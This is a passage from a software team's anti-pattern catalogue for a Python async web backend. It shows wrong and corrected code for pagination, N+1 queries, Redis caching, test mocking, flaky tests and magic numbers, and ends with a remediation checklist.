- With dual engines: 80 connections needed
- With async only: 40 connections needed
- **Savings:** 50% connection reduction

**Correct Pattern (AFTER - DB-OPT):**
```python
# backend/src/utils/database.py (NEW)
class DatabaseManager:
    def __init__(self, database_url):
        # CORRECT! Async only (Quart is async)
        self._async_engine = create_async_engine(
            database_url,
            pool_size=20,
            max_overflow=10
        )
        # NO sync engine needed!
        # Total: 20 connections (50% reduction)

# For Alembic migrations (sync required)
def get_sync_engine_for_migrations(database_url):
    """Separate sync engine ONLY for migrations."""
    return create_engine(
        database_url,
        pool_size=5,  # Small pool (migrations only)
        max_overflow=5
    )
```

**Detection:**
```bash
# Find dual engine usage
grep -r "create_engine" backend/src/utils/database.py
grep -r "create_async_engine" backend/src/utils/database.py
```

**Prevention:**
- Async-only architecture (Quart → asyncpg)
- Separate sync engine for migrations only
- Monitor connection pool usage
- Alert if connections > 80% of pool

---

## 4. Architectural Anti-Patterns

### AP-ARCH-005: Missing Pagination

**Status:** ⚠️ PRESENT (needs PERF-1 work stream)

**Description:** List endpoints return all results without pagination, causing memory exhaustion at scale.

**Example (DON'T DO THIS):**
```python
# WRONG! Returns ALL exercises (unbounded)
@exercises_bp.route("/history", methods=["GET"])
async def get_exercise_history():
    async with get_async_db_session() as session:
        # ISSUE: No LIMIT clause!
        stmt = select(UserExercise).where(UserExercise.user_id == g.user_id)
        result = await session.execute(stmt)
        exercises = result.scalars().all()  # Could be 10,000+ results!

    return jsonify([serialize(ex) for ex in exercises])
```

**Why It's Bad:**
- Memory exhaustion (loading 10,000+ rows)
- Slow JSON serialization (large response)
- Network timeout (response too large)
- Poor user experience (overwhelming UI)

**Attack Scenario:**
```
User completes 10,000 exercises
GET /api/exercises/history
→ Loads 10,000 rows from DB
→ Serializes 10,000 JSON objects
→ Response size: ~5MB
→ Server memory: ~100MB
→ Response time: 30+ seconds
→ Timeout!
```

**Correct Pattern:**
```python
# CORRECT! Paginated results
@exercises_bp.route("/history", methods=["GET"])
async def get_exercise_history():
    # Parse pagination parameters
    page = request.args.get("page", default=1, type=int)
    page_size = request.args.get("page_size", default=20, type=int)

    # Validate parameters
    if page < 1:
        raise APIError("Page must be >= 1", status_code=400)
    if page_size < 1 or page_size > 100:
        raise APIError("Page size must be between 1 and 100", status_code=400)

    async with get_async_db_session() as session:
        # Get total count (for pagination metadata)
        count_stmt = (
            select(func.count())
            .select_from(UserExercise)
            .where(UserExercise.user_id == g.user_id)
        )
        total = await session.scalar(count_stmt)

        # Get paginated results
        offset = (page - 1) * page_size
        stmt = (
            select(UserExercise)
            .where(UserExercise.user_id == g.user_id)
            .order_by(UserExercise.created_at.desc())
            .limit(page_size)
            .offset(offset)
        )
        result = await session.execute(stmt)
        exercises = result.scalars().all()

    # Return with pagination metadata
    return jsonify({
        "data": [serialize(ex) for ex in exercises],
        "pagination": {
            "page": page,
            "page_size": page_size,
            "total": total,
            "total_pages": (total + page_size - 1) // page_size,
            "has_next": (page * page_size) < total,
            "has_prev": page > 1
        }
    })
```

**Frontend Integration:**
```typescript
// frontend/src/services/api.ts
export const getExerciseHistory = async (page: number = 1) => {
    const response = await apiClient.get(`/exercises/history`, {
        params: { page, page_size: 20 }
    });
    return response.data;
};

// frontend/src/pages/ExerciseHistoryPage.tsx
const ExerciseHistoryPage = () => {
    const [page, setPage] = useState(1);
    const { data, pagination } = useExerciseHistory(page);

    return (
        <>
            <ExerciseList exercises={data} />
            <Pagination
                page={page}
                totalPages={pagination.total_pages}
                onPageChange={setPage}
            />
        </>
    );
};
```

**Detection:**
```bash
# Find list endpoints without pagination
grep -r "GET.*route" backend/src/api/ | \
  while read file; do
    if grep -q "select.*all()" "$file" && ! grep -q "limit\|offset\|page" "$file"; then
      echo "Missing pagination: $file"
    fi
  done
```

**Prevention:**
- All list endpoints MUST have pagination
- Default page_size: 20
- Max page_size: 100 (prevent abuse)
- Return pagination metadata
- Frontend: Infinite scroll or page numbers
- Code review: "Does this endpoint return unbounded results?"

---

## 5. Security Anti-Patterns

(Covered in sections 1-2 above)

## 6. Performance Anti-Patterns

### AP-PERF-001: N+1 Query Problem

**Status:** ⚠️ PRESENT (needs PERF-1 work stream)

**Description:** Queries executed in a loop, causing N+1 database round-trips.

**Example (DON'T DO THIS):**
```python
# backend/src/services/progress_service.py (CURRENT)
async def calculate_statistics(user_ids: List[int]):
    stats = []

    # ISSUE: Executes 1 + N queries
    async with get_async_db_session() as session:
        for user_id in user_ids:  # Loop = N queries
            # Query #1, #2, #3, ... #N
            stmt = select(UserExercise).where(UserExercise.user_id == user_id)
            result = await session.execute(stmt)
            exercises = result.scalars().all()

            stats.append({
                "user_id": user_id,
                "total_exercises": len(exercises)
            })

    return stats
```

**Why It's Bad:**
- Linear degradation with user count
- 1,000 users = 1,000+ database queries
- High latency (network round-trips)
- Database connection exhaustion

**Performance Impact:**
```
100 users:
- Without fix: 100 queries × 10ms = 1,000ms (1 second)
- With fix: 1 query × 10ms = 10ms (100x faster!)

1,000 users:
- Without fix: 1,000 queries × 10ms = 10,000ms (10 seconds)
- With fix: 1 query × 10ms = 10ms (1000x faster!)
```

**Correct Pattern (Eager Loading):**
```python
# CORRECT! Single query with JOIN
async def calculate_statistics(user_ids: List[int]):
    async with get_async_db_session() as session:
        # Single query with eager loading
        stmt = (
            select(User)
            .where(User.id.in_(user_ids))
            .options(
                selectinload(User.exercises)  # JOIN in single query
            )
        )
        result = await session.execute(stmt)
        users = result.scalars().all()

        # Now exercises are already loaded (no additional queries)
        stats = [
            {
                "user_id": user.id,
                "total_exercises": len(user.exercises)  # No query!
            }
            for user in users
        ]

    return stats
```

**Alternative (Aggregation Query):**
```python
# EVEN BETTER! Database aggregation
async def calculate_statistics(user_ids: List[int]):
    async with get_async_db_session() as session:
        # Single aggregation query
        stmt = (
            select(
                UserExercise.user_id,
                func.count(UserExercise.id).label('total_exercises')
            )
            .where(UserExercise.user_id.in_(user_ids))
            .group_by(UserExercise.user_id)
        )
        result = await session.execute(stmt)

        return [
            {"user_id": row.user_id, "total_exercises": row.total_exercises}
            for row in result
        ]
```

**Detection:**
```bash
# Find queries in loops
grep -A 5 "for .* in" backend/src/services/ | \
  grep -B 5 "select\|execute"
```

**Prevention:**
- Use `selectinload()` for one-to-many relationships
- Use `joinedload()` for many-to-one relationships
- Use aggregation queries instead of counting in Python
- Code review: "Is there a query inside a loop?"
- Performance testing: measure query count per request

**SQLAlchemy Loading Strategies:**
```python
from sqlalchemy.orm import selectinload, joinedload, subqueryload

# selectinload: Separate SELECT (best for one-to-many)
select(User).options(selectinload(User.exercises))
# Query 1: SELECT * FROM users WHERE id IN (...)
# Query 2: SELECT * FROM user_exercises WHERE user_id IN (...)

# joinedload: LEFT JOIN (best for many-to-one)
select(UserExercise).options(joinedload(UserExercise.user))
# SELECT * FROM user_exercises LEFT JOIN users ON ...

# subqueryload: Subquery (best for complex relationships)
select(User).options(subqueryload(User.exercises))
# SELECT * FROM user_exercises WHERE user_id IN (
#   SELECT id FROM users WHERE ...
# )
```

---

### AP-PERF-002: Missing Caching

**Status:** ⚠️ PRESENT (needs PERF-1 work stream)

**Description:** Frequently accessed, rarely changing data not cached.

**Example (DON'T DO THIS):**
```python
# WRONG! Fetches user profile on EVERY request
@exercises_bp.route("/daily", methods=["GET"])
@require_auth
async def get_daily_exercise():
    # ISSUE: Database query on every request
    user = await profile_service.get_user(g.user_id)  # DB query!

    # Use profile to generate exercise
    exercise = await exercise_service.generate(user.preferences)
```

**Why It's Bad:**
- Unnecessary database load (same data fetched repeatedly)
- Slower response times (network latency)
- Higher costs (more database connections)

**Performance Impact:**
```
Without cache:
- 1,000 requests/min = 1,000 DB queries/min
- Average query time: 10ms
- Total DB time: 10,000ms/min = 167ms/request avg

With cache (80% hit rate):
- 1,000 requests/min = 200 DB queries/min (800 from cache)
- Average query time: 10ms (DB), 1ms (Redis)
- Total DB time: 2,000ms/min = 2ms/request avg
- **Speedup:** 83x faster!
```

**Correct Pattern:**
```python
# utils/cache.py (FUTURE - PERF-1)
import json
from typing import Optional, Callable
from src.utils.redis_client import get_redis

def cached(
    key_prefix: str,
    ttl: int = 300,  # 5 minutes default
    key_builder: Optional[Callable] = None
):
    """
    Decorator for caching function results in Redis.

    Args:
        key_prefix: Prefix for cache key
        ttl: Time to live in seconds
        key_builder: Function to build cache key from args
    """
    def decorator(func):
        async def wrapper(*args, **kwargs):
            # Build cache key
            if key_builder:
                cache_key = f"{key_prefix}:{key_builder(*args, **kwargs)}"
            else:
                cache_key = f"{key_prefix}:{args}:{kwargs}"

            # Try to get from cache
            redis_client = get_redis()
            cached_value = redis_client.get(cache_key)

            if cached_value:
                logger.debug(f"Cache HIT: {cache_key}")
                return json.loads(cached_value)

            # Cache miss - call function
            logger.debug(f"Cache MISS: {cache_key}")
            result = await func(*args, **kwargs)

            # Store in cache
            redis_client.setex(
                cache_key,
                ttl,
                json.dumps(result)
            )

            return result

        return wrapper
    return decorator

# services/profile_service.py (FUTURE - PERF-1)
from src.utils.cache import cached

class ProfileService:
    @staticmethod
    @cached(key_prefix="user_profile", ttl=300)  # 5 min cache
    async def get_user(user_id: int):
        """Get user profile (cached)."""
        async with get_async_db_session() as session:
            stmt = select(User).where(User.id == user_id)
            result = await session.execute(stmt)
            user = result.scalar_one_or_none()

            if not user:
                raise UserNotFoundError(f"User {user_id} not found")

            return {
                "id": user.id,
                "email": user.email,
                "name": user.name,
                "preferences": user.preferences
            }
```

**Cache Invalidation:**
```python
# When user updates profile, invalidate cache
@users_bp.route("/me", methods=["PUT"])
@require_auth
async def update_profile():
    data = await request.get_json()

    # Update database
    user = await profile_service.update_user(g.user_id, data)

    # Invalidate cache (CRITICAL!)
    redis_client = get_redis()
    redis_client.delete(f"user_profile:{g.user_id}")

    return jsonify(user)
```

**What to Cache:**
- ✅ User profiles (rarely change)
- ✅ Achievement definitions (static data)
- ✅ Exercise templates (static data)
- ✅ LLM responses for common questions (high cost)
- ❌ User exercise progress (changes frequently)
- ❌ Real-time data (chat messages, notifications)

**Detection:**
```bash
# Find frequently called methods without caching
grep -r "@staticmethod" backend/src/services/ | \
  while read file; do
    if ! grep -q "cache\|redis" "$file"; then
      echo "No caching: $file"
    fi
  done
```

**Prevention:**
- Identify frequently accessed data
- Measure database query frequency
- Implement Redis caching for read-heavy data
- Set appropriate TTL (balance freshness vs performance)
- Invalidate cache on updates
- Monitor cache hit rate (target: >70%)

---

## 7. Testing Anti-Patterns

### AP-TEST-001: Over-Mocking in Unit Tests

**Status:** ⚠️ PRESENT (needs improvement)

**Description:** Mocking internal components instead of external boundaries, defeating the purpose of integration testing.

**Example (DON'T DO THIS):**
```python
# backend/tests/test_exercise_service.py (WRONG APPROACH)
@pytest.fixture
def mock_database(mocker):
    # WRONG! Mocking internal database layer
    mock_db = mocker.patch("src.utils.database.get_async_db_session")
    mock_session = AsyncMock()
    mock_db.return_value.__aenter__.return_value = mock_session
    return mock_session

@pytest.fixture
def mock_llm_service(mocker):
    # WRONG! Mocking internal LLM service
    mock_llm = mocker.patch("src.services.llm.llm_service.LLMService")
    mock_llm.return_value.generate_exercise.return_value = "mocked exercise"
    return mock_llm

async def test_generate_exercise(mock_database, mock_llm_service):
    # ISSUE: Test passes even if real integration is broken!
    service = ExerciseService()
    result = await service.generate_exercise(user_id=1)

    assert result == "mocked exercise"  # Meaningless assertion
```

**Why It's Bad:**
- Tests pass even if real code is broken
- Doesn't test actual integration points
- Gives false confidence in code quality
- Misses bugs that occur at integration boundaries

**Real-World Example:**
```
Test says: "Exercise generation works!" ✅
Reality: LLM integration broken, all production requests fail ❌
Why: Test mocked LLMService, never called real LLM
```

**Correct Pattern (Integration Testing):**
```python
# backend/tests/conftest.py (CORRECT APPROACH)
@pytest.fixture
async def test_database():
    """Real test database (not mocked)."""
    # Create test database
    db_manager = DatabaseManager(database_url=TEST_DATABASE_URL)
    await db_manager.create_all_tables()

    yield db_manager

    # Cleanup
    await db_manager.drop_all_tables()
    await db_manager.close()

@pytest.fixture
def mock_llm_provider(mocker):
    """Mock EXTERNAL LLM API (boundary), not internal service."""
    # CORRECT! Mock external boundary (GROQ API)
    mock_response = {
        "choices": [{"message": {"content": "Generated exercise"}}]
    }
    mocker.patch(
        "requests.post",  # Mock external HTTP call
        return_value=MagicMock(json=lambda: mock_response)
    )

async def test_generate_exercise_integration(test_database, mock_llm_provider):
    # CORRECT! Test real integration
    service = ExerciseService()  # Real service

    # Create real test user in database
    async with test_database.get_async_session() as session:
        user = User(id=1, email="test@test.com")
        session.add(user)
        await session.commit()

    # Call real service method
    result = await service.generate_exercise(user_id=1)

    # MEANINGFUL assertion (tests real integration)
    assert result is not None
    assert result.user_id == 1

    # Verify database was called (real integration)
    async with test_database.get_async_session() as session:
        stmt = select(UserExercise).where(UserExercise.user_id == 1)
        exercises = await session.execute(stmt)
        assert exercises.scalar_one_or_none() is not None
```

**Mocking Guidelines:**
- ✅ **DO Mock:** External services (LLM APIs, email services, payment gateways)
- ✅ **DO Mock:** Slow operations (file I/O, network calls)
- ✅ **DO Mock:** Non-deterministic operations (datetime.now(), random())
- ❌ **DON'T Mock:** Internal database layer
- ❌ **DON'T Mock:** Internal services
- ❌ **DON'T Mock:** Business logic
- ❌ **DON'T Mock:** The thing you're trying to test!

**Detection:**
```bash
# Find tests mocking internal components
grep -r "mocker.patch.*src\." backend/tests/ | \
  grep -v "requests\|httpx\|smtplib"  # External is OK
```

**Prevention:**
- Integration tests over unit tests
- Mock at system boundaries (external APIs, not internal code)
- Use real database for tests (with cleanup)
- If testing service, use real database and real other services
- Only mock external dependencies

---

### AP-TEST-002: Flaky Tests

**Status:** ⚠️ PRESENT (timing issues)

**Description:** Tests that pass/fail intermittently due to timing, race conditions, or shared state.

**Example (DON'T DO THIS):**
```python
# WRONG! Race condition
async def test_chat_message():
    # Send message
    await chat_service.send_message(user_id=1, content="Hello")

    # ISSUE: Message may not be committed yet!
    messages = await chat_service.get_messages(conversation_id=1)

    # Flaky! Sometimes passes, sometimes fails
    assert len(messages) == 1  # Race condition
```

**Why It's Bad:**
- Wastes developer time investigating failures
- Reduces trust in test suite
- May hide real bugs
- Blocks CI/CD pipeline

**Correct Pattern:**
```python
# CORRECT! Explicit wait for database flush
async def test_chat_message():
    # Send message
    message_id = await chat_service.send_message(user_id=1, content="Hello")

    # Wait for database commit
    async with get_async_db_session() as session:
        await session.flush()  # Ensure committed

    # Now query
    messages = await chat_service.get_messages(conversation_id=1)

    # Reliable assertion
    assert len(messages) == 1
    assert messages[0].id == message_id
```

**Shared State Issues:**
```python
# WRONG! Tests share state
test_user = None  # Global variable!

async def test_create_user():
    global test_user
    test_user = await user_service.create(email="test@test.com")
    assert test_user.id is not None

async def test_get_user():
    # ISSUE: Depends on test_create_user running first!
    user = await user_service.get(test_user.id)
    assert user.email == "test@test.com"
```

**Correct Pattern (Isolated Tests):**
```python
# CORRECT! Each test is independent
@pytest.fixture
async def test_user():
    """Create fresh user for each test."""
    user = await user_service.create(email="test@test.com")
    yield user
    # Cleanup
    await user_service.delete(user.id)

async def test_create_user():
    # Independent test
    user = await user_service.create(email="unique@test.com")
    assert user.id is not None

async def test_get_user(test_user):
    # Independent test (uses fixture)
    user = await user_service.get(test_user.id)
    assert user.email == "test@test.com"
```

**Detection:**
```bash
# Run tests multiple times to detect flakiness
for i in {1..10}; do
    pytest backend/tests/
    if [ $? -ne 0 ]; then
        echo "Flaky test detected on run $i"
    fi
done
```

**Prevention:**
- No shared mutable state between tests
- Explicit database flushes/commits
- Fixtures for test data (clean up after each test)
- No test execution order dependencies
- Avoid `time.sleep()` (use explicit waits)
- Mark slow tests: `@pytest.mark.slow`

---

## 8. Code Quality Anti-Patterns

### AP-CODE-001: Magic Numbers

**Status:** ⚠️ PRESENT (needs refactoring)

**Description:** Hardcoded numeric literals without explanation.

**Example (DON'T DO THIS):**
```python
# backend/src/middleware/rate_limiter.py (CURRENT)
async def rate_limit_check(user_id: int):
    key = f"rate_limit:{user_id}"

    # ISSUE: What is 60? What is 100?
    count = await redis.incr(key)
    if count == 1:
        await redis.expire(key, 60)  # Magic number!

    if count > 100:  # Magic number!
        raise APIError("Rate limit exceeded")
```

**Why It's Bad:**
- Unclear intent (what do numbers mean?)
- Hard to change (find all occurrences)
- Easy to make mistakes (typos, wrong units)

**Correct Pattern:**
```python
# CORRECT! Named constants
# backend/src/middleware/rate_limiter.py
RATE_LIMIT_WINDOW_SECONDS = 60          # 1 minute
RATE_LIMIT_MAX_REQUESTS = 100           # requests per window
RATE_LIMIT_BURST_FACTOR = 1.5           # Allow 50% burst

async def rate_limit_check(user_id: int):
    key = f"rate_limit:{user_id}"

    count = await redis.incr(key)
    if count == 1:
        await redis.expire(key, RATE_LIMIT_WINDOW_SECONDS)  # Clear!

    max_requests = int(RATE_LIMIT_MAX_REQUESTS * RATE_LIMIT_BURST_FACTOR)
    if count > max_requests:  # Clear intent!
        raise APIError(
            f"Rate limit exceeded. Max {max_requests} requests per "
            f"{RATE_LIMIT_WINDOW_SECONDS} seconds"
        )
```

**Common Magic Numbers:**
```python
# Timeouts
await asyncio.sleep(300)  # WRONG!
await asyncio.sleep(CACHE_TTL_SECONDS)  # CORRECT!

# Sizes
if len(text) > 5000:  # WRONG!
if len(text) > MAX_MESSAGE_LENGTH:  # CORRECT!

# Percentages
if score > 0.8:  # WRONG!
if score > PASSING_SCORE_THRESHOLD:  # CORRECT!

# Status codes
return jsonify(data), 200  # WRONG!
return jsonify(data), HTTP_OK  # CORRECT!
```

**Detection:**
```bash
# Find numeric literals (excluding 0, 1, -1)
grep -rE '\s[0-9]{2,}' backend/src/ --include="*.py" | \
  grep -v "TODO\|FIXME\|test_"
```

**Prevention:**
- Define constants at module level
- Use `enum` for related constants
- Comment constants with units (seconds, bytes, etc.)
- Code review: "Should this number be a constant?"

---

## Summary Checklist

### Critical Issues (P0) - ALL RESOLVED ✅
- [x] AP-CRIT-001: Hardcoded URLs → FIXED (SEC-1)
- [x] AP-CRIT-002: OAuth token exposure → FIXED (SEC-1)
- [x] AP-CRIT-003: Password reset sessions → VERIFIED (already implemented)
- [x] AP-CRIT-004: Secrets in git → FIXED (SEC-2-GIT)

### High Priority (P1) - MOSTLY FIXED
- [x] AP-SEC-001: localStorage tokens → FIXED (SEC-1-FE)
- [x] AP-SEC-002: Input validation → FIXED (SEC-3-INPUT)
- [x] AP-SEC-003: XSS protection → FIXED (SEC-3-INPUT)
- [x] AP-SEC-004: SQL injection → VERIFIED (SQLAlchemy prevents)
- [x] AP-SEC-005: DoS oversized inputs → FIXED (SEC-3-INPUT)

### Medium Priority (P2) - NEEDS WORK
- [ ] AP-ARCH-001: God objects → Refactor LLMService
- [ ] AP-ARCH-002: Tight coupling → Add dependency injection
- [ ] AP-ARCH-003: Missing repository pattern → Future enhancement
- [x] AP-ARCH-004: Dual engines → FIXED (DB-OPT)
- [ ] AP-ARCH-005: Missing pagination → PERF-1
- [ ] AP-PERF-001: N+1 queries → PERF-1
- [ ] AP-PERF-002: Missing caching → PERF-1
- [ ] AP-TEST-001: Over-mocking → Improve tests (QA-1)
- [ ] AP-TEST-002: Flaky tests → Fix timing issues (QA-1)
- [ ] AP-CODE-001: Magic numbers → Refactor constants

### Prevention Strategies

1. **Pre-Commit Hooks** (IMPLEMENTED ✅)
   - Block secrets in commits
   - Block .env files
   - Run linters (Black, Pylint, mypy)

2. **Code Review Checklist**
   - [ ] All URLs from settings?
   - [ ] Pydantic schema for request body?
   - [ ] Maximum length on text fields?
   - [ ] Pagination for list endpoints?
   - [ ] Constants instead of magic numbers?

3. **Automated Testing**
   - [ ] Security scanning (Bandit, Safety)
   - [ ] Static analysis (mypy, Pylint)
   - [ ] Test coverage gates (>80%)
   - [ ] E2E tests for critical flows

4. **Monitoring (OPS-1 - Pending)**
   - [ ] Error tracking (Sentry)
   - [ ] Performance monitoring (Prometheus)
   - [ ] Security alerts (failed logins, rate limits)
   - [ ] Cost tracking (LLM usage)

---

**Document Version:** 1.0
**Last Updated:** 2025-12-06
**Status:** Complete

**Related Documents:**
- `/devlog/arch-review/architectural-review-report.md` - Full review
- `/docs/critical-issues-for-roadmap.md` - Escalated issues
- `/plans/roadmap.md` - Work stream planning
